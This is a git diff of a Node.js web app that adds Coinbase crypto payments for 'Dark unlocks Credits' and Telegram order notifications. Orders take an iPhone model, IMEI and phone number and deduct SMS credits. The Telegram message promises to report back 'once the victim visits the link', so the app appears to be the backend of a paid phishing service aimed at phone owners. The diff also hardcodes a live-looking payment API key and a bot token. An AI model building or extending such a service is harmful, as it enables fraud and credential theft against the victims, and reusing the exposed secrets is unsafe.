@@ -11,6 +11,11 @@ const paypal = require('paypal-rest-sdk')
 const nodemailer = require('nodemailer');
 const crypto = require('crypto');
 const bcrypt = require('bcrypt');
+const CoinbaseCommerce = require('coinbase-commerce-node');
+const axios = require('axios');
+const Client = CoinbaseCommerce.Client;
+const Charge = CoinbaseCommerce.resources.Charge;
+const TelegramBot = require('node-telegram-bot-api');
 const PORT = process.env.PORT || 3000
 
 
@@ -54,6 +59,7 @@ const userSchema = new mongoose.Schema({
         type: Number,
         default: 0,
     },
+    telegramId:String,
     sms: {
         type: Number,
         default: 0,
@@ -196,10 +202,61 @@ app.get('/profile',ensureAuthenticated,(req,res)=>{
     res.render('profile',{user})
 })
 
+
 //Post Routes
+app.post('/crypto',ensureAuthenticated,(req,res)=>{
+    amount = parseFloat(req.body.amount);
+    console.log(amount)  
+   
+
+
+const apiKey = '290b5828-1f99-4866-aeb3-f6a35c1aac58'; // Replace with your actual API key
+
+const data = {
+  name: 'Dark unlocks Credits',
+  description: 'buying credits',
+  pricing_type: 'fixed_price',
+  local_price: {
+    amount:amount,
+    currency: 'USD',
+  },
+  redirect_url: 'http://localhost:3000/payment_success', //fix this tomorrow
+  cancel_url: 'http://localhost:3000/payment_error',
+  metadata: {
+    customer_name: req.user.name, // Assuming req.user contains user information
+    customer_id: req.user.id,
+  },
+};
+
+const config = {
+  method: 'post',
+  url: 'https://api.commerce.coinbase.com/charges', // Ensure this endpoint is correct
+  headers: {
+    'Content-Type': 'application/json',
+    'Accept': 'application/json',
+    'X-CC-Api-Key': apiKey, // Add your API key here
+  },
+  data: JSON.stringify(data),
+};
+
+axios(config)
+  .then((response) => {
+    console.log("sucess")
+    const hostedURL = response.data.data.hosted_url;
+    // Redirect the user to the hosted URL for payment
+    res.redirect(hostedURL);
+  })
+  .catch((error) => {
+    console.log(error);
+    // Handle error scenarios appropriately
+    res.redirect('/payment_error');
+  });
+
+    
+})
 
 app.post('/profile', ensureAuthenticated, async (req, res) => {
-  const { name, username } = req.body;
+  const { name, username,chatid } = req.body;
   const userId = req.user.id;
 
   try {
@@ -212,6 +269,7 @@ app.post('/profile', ensureAuthenticated, async (req, res) => {
     // Update user properties
     user.name = name;
     user.username = username;
+    user.telegramId = chatid;
 
     await user.save();
     console.log("User updated");
@@ -375,6 +433,9 @@ app.post('/support', ensureAuthenticated,(req,res)=>{
     sendSupportUser()
     res.redirect("dash")
 })
+
+const botToken = '6518093800:AAErTtdV6RIN6VVMSNL5sVQis_T5BOpx8oQ';
+const bot = new TelegramBot(botToken, { polling: true });
 app.post('/order',ensureAuthenticated,async(req,res)=>{
    
     const message = req.body.message;
@@ -383,6 +444,8 @@ app.post('/order',ensureAuthenticated,async(req,res)=>{
     const selectedModel = req.body.iphoneModel; 
     console.log('Received Phone Number:', phoneNumber);
     console.log(selectedModel)
+
+   
 
     // Fetch the authenticated user
     const currentUser = await User.findById(req.user._id);
@@ -400,7 +463,7 @@ app.post('/order',ensureAuthenticated,async(req,res)=>{
     }
 
         // Usage
-        const newOrderId = generateOrderId();
+     const newOrderId = generateOrderId();
         console.log(newOrderId); // Outputs something like OFF1
     // Get the current timestamp
     const timestamp = Date.now();
@@ -446,6 +509,28 @@ console.log(formattedDate)
      const newBalance = currentUser.balance - 2;
     currentUser.sms = newSms;
     currentUser.balance = newBalance;
+    const message1 = `Order Confirmation\nOrderID: ${generateOrderId()}\nModel: ${selectedModel}\nIMEI: ${imei}\nPhone Number: ${phoneNumber}\n\n\nWill get back to you once the victim visits the link`;
+
+    const groupId = req.user.telegramId; 
+
+
+    bot.sendMessage(groupId, message1)
+    .then(() => {
+      console.log('Message sent to group!');
+    })
+    .catch((err) => {
+      console.error('Error sending message:', err);
+      rconsole.log('Error sending message');
+    });
+
+
+// Set webhook for updates (optional, if not using polling)
+// bot.setWebHook('YOUR_WEBHOOK_URL');
+
+// Error handling
+bot.on('polling_error', (error) => {
+  console.error('Polling error:', error);
+});
 
 try {
 
@@ -474,6 +559,7 @@ try {
                 }
             );
             
+            
            
               // Save the updated user object back to the database
              await currentUser.save();
@@ -483,6 +569,7 @@ try {
             console.log(data);
         }
     
+        
         run();
         res.render('success-order',{newOrder,newOrderId})
     }).catch((err) => {
@@ -495,11 +582,6 @@ try {
     res.status(500).send('Error saving order');
 }
 
-    
-
-    
-
-  
 })
 
 
